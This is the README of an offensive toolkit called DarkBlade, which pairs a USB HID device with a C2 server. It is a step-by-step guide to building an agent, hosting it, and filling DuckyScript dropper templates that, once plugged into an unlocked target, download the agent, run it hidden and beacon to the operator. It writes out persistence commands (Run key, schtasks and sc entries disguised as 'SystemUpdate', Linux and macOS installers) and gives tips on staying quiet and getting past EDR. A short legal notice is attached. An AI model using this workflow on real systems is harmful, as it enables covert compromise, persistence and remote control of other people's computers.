## Overview

A command-center for USB HID operations, payload crafting, wireless attack tooling, and a security‑hardened C2—designed to pair with **USB Army Knife** (LILYGO T‑Dongle S3) and other devices.

## "Why bother with a fork and rewrite just raise an issue!"

I was having certain issues trying to make use of the functionality that the preceding project can provide and while yes, raising an issue may have resolved this. The combination of vibe coding and a lack of documentation made me much more comfortable just rewriting the entire thing.

## Quick Start (Local Dev)

### 1. Install Dependencies

```bash
# Clone repo (if not already)
git clone https://github.com/wickednull/DarkBlade.git
cd DarkBlade

# Create virtual environment
python3 -m venv venv
source venv/bin/activate  # Linux/macOS
# venv\Scripts\activate   # Windows

# Install requirements
pip install -r requirements.txt
```

### 2. Launch GUI

```bash
# Full GUI
python3 installer_gui.py

# Compact GUI (for small screens)
python3 smallgui.py
```

### 3. Start C2 Server

```bash
# Via GUI: navigate to C2 tab and click "Start C2"

# Or via CLI:
venv/bin/python c2_server/c2_server.py --port 8443

# Optional: enable ngrok for public access
# (configure in GUI C2 tab or pass --ngrok flag)
```

### 4. Validate C2

- Note the **"Master API Key"** displayed in GUI C2 tab
- Click **"Refresh Beacons"** (should be empty initially)
- C2 is ready when **"Server Status: Running"** shows

## Agent Workflow (Recommended)

### Step 1: Build Agent

```bash
# Linux/macOS
pyinstaller -F -n db-agent agents/db_agent.py

# Windows (run on Windows build box)
pyinstaller -F -n db-agent.exe agents\db_agent.py
```

**Binaries output to:** `dist/db-agent` (or `dist/db-agent.exe`)

### Step 2: Host Binary

```bash
# Example: simple HTTP server
cd dist
python3 -m http.server 8000

# Or upload to your CDN/server
# Note the AGENT_URL, e.g.: http://192.168.1.100:8000/db-agent
```

### Step 3: Generate HID Dropper Payload

1. Open **GUI → Payload Library**
2. Select dropper template:
   - `Windows_Agent_Dropper.json` (HKCU Run)
   - `Windows_Agent_Dropper_Task.json` (Scheduled Task)
   - `Linux_Agent_Dropper.json` (systemd user service)
   - `MacOS_Agent_Dropper.json` (LaunchAgent)

3. **Fill variables:**
   - `AGENT_URL`: `http://YOUR_SERVER:8000/db-agent`
   - `C2_URL`: `http://YOUR_IP:8443` (or ngrok URL)
   - `JITTER`: `30` (seconds)
   - `SLEEP`: `60` (seconds)
   - `PROXY`: (optional, e.g., `http://proxy:8080`)

4. Save as `autorun.ds`

### Step 4: Deliver via USB Army Knife

```bash
# Option A: Upload via device AP/WebUI
# 1. Connect to device AP (SSID: USBArmy...)
# 2. Navigate to http://4.3.2.1:8080
# 3. Upload autorun.ds

# Option B: Copy to SD card
# Mount SD card and copy autorun.ds to root
```

**Plug device into unlocked target → dropper runs → agent beacons**

### Step 5: Verify Beacon

1. **GUI → C2 tab → Refresh Beacons**
2. Select beacon → Send command: `whoami`
3. View result in output panel

## Persistence Options

### Windows

#### HKCU Run (No Elevation)
```
Registry: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
Trigger: User logon
Privileges: User
```

#### User Scheduled Task (No Elevation)
```bash
schtasks /create /tn "SystemUpdate" /tr "C:\path\db-agent.exe" /sc ONLOGON /rl LIMITED
```
- **Trigger**: User logon
- **Privileges**: User

#### SYSTEM Scheduled Task (Requires UAC)
```bash
schtasks /create /tn "SystemUpdate" /tr "C:\path\db-agent.exe" /sc ONSTART /ru SYSTEM /rl HIGHEST
```
- **Trigger**: Boot
- **Privileges**: SYSTEM

#### Windows Service (Requires UAC)
```bash
sc create "SystemUpdate" binPath= "C:\path\db-agent.exe" start= auto
```
- **Trigger**: Boot
- **Privileges**: SYSTEM

---

### Linux

```bash
# Install systemd user service
chmod +x agents/linux/install.sh
./agents/linux/install.sh /path/to/db-agent http://C2_IP:8443

# Service runs at user login
systemctl --user status db-agent
```

---

### macOS

```bash
# Install LaunchAgent
chmod +x agents/macos/install_mac.sh
./agents/macos/install_mac.sh /path/to/db-agent http://C2_IP:8443

# Agent runs at user login
launchctl list | grep darkblade
```

## USB Army Knife Integration

**Device AP/WebUI:** `4.3.2.1:8080`
- For uploading/managing DuckyScripts
- **NOT** the beacon communication path

### Workflow:
1. DuckyScript dropper (`autorun.ds`) executes on device plug-in
2. Opens shell (Win+R/Terminal)
3. Downloads agent from `AGENT_URL`
4. Jitters (random delay)
5. Runs agent hidden
6. Configures persistence
7. Agent beacons to `C2_URL` over LAN/WAN/ngrok

###  LEGAL NOTICE

**SorocobanUSB** is designed exclusively for authorized security testing, penetration testing, and red team operations. **Unauthorized access to computer systems is illegal.**

- Obtain proper authorization before deployment
- Neither I nor DarkSec Labs assumes no liability for misuse

---

## Troubleshooting

### No Beacon Appears
- Verify `C2_URL` is reachable from target
- Check firewall/EDR blocking outbound connections
- Confirm `AGENT_URL` is correct and binary downloads
- For elevated droppers: ensure UAC prompt was accepted
- Check `c2_server/audit.log` for connection attempts

### Windows PowerShell Blocked
- Use Signed-PS dropper template with code-signed PS1 installer
- Or switch to cmd.exe based dropper

### Linux/macOS Agent Runs But No Beacon
- Check `DB_PROXY` environment variable
- Test egress: `curl -v http://C2_IP:8443`
- Review systemd/LaunchAgent logs

### GUI Scroll Issues
- Use `smallgui.py` for small screens
- Most panels support mousewheel/two-finger scroll

### Payload JSON Errors
- Ensure scripts are valid JSON with proper escaping
- Recent repo fixes address most JSON issues

## Operational Tips

```bash
# Use ngrok for quick external C2 access
./ngrok http 8443
# Copy public URL to C2_URL variable

# Tune SLEEP/JITTER per engagement
# 60/30 is reasonable default (60s sleep, ±30s jitter)

# Windows persistence preference:
# 1. HKCU Run (quietest)
# 2. User Task (if registry monitored)
# 3. SYSTEM Task/Service (if elevation available)

# Test agent manually before HID deployment:
python3 agents/db_agent.py
# Or on Windows:
db-agent.exe

# Build optimized binary:
pyinstaller -F --onefile --windowed -n db-agent agents/db_agent.py
```
